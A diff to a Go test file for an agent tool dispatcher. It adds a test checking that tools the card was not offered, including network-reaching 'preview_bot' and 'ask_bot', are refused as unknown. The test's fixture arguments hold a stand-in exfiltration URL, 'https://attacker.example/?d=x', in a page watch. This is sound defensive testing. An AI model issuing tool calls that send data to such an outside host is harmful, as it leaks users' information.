@@ -255,6 +255,29 @@ func TestDescribeOffersTheReadToolsACardNeeds(t *testing.T) {
 	}
 }
 
+// A tool the card was not offered never runs, even a read tool in the
+// catalog: preview_bot and ask_bot reach the network and are chat only.
+func TestDescribeRefusesToolsItDidNotOffer(t *testing.T) {
+	ran := map[string]bool{}
+	catalog := agent.Catalog{}
+	for _, name := range []string{"list_tasks", "preview_bot", "ask_bot", "list_bots"} {
+		catalog[name] = agent.Tool{Description: name, Call: func(context.Context, string, json.RawMessage) (any, error) {
+			ran[name] = true
+			return map[string]any{"ok": true}, nil
+		}}
+	}
+	tools := newDescribeTools("u1", catalog, nil, "")
+	for _, name := range []string{"preview_bot", "ask_bot", "list_bots"} {
+		out := tools.call(context.Background(), toolCall("c-"+name, name, map[string]any{"watches": []any{map[string]any{"kind": "page", "url": "https://attacker.example/?d=x"}}}).ToolCalls[0])
+		if ran[name] || !strings.Contains(out, "unknown tool") {
+			t.Errorf("%s: ran %v, result %s", name, ran[name], out)
+		}
+	}
+	if out := tools.call(context.Background(), toolCall("c1", "list_tasks", map[string]any{}).ToolCalls[0]); !ran["list_tasks"] || strings.Contains(out, "error") {
+		t.Errorf("an offered tool: ran %v, result %s", ran["list_tasks"], out)
+	}
+}
+
 // The board prompt with its tools is cached, and each turn's whole request
 // is marked so the next turn reads it back.
 func TestDescribeMarksWhatToCache(t *testing.T) {
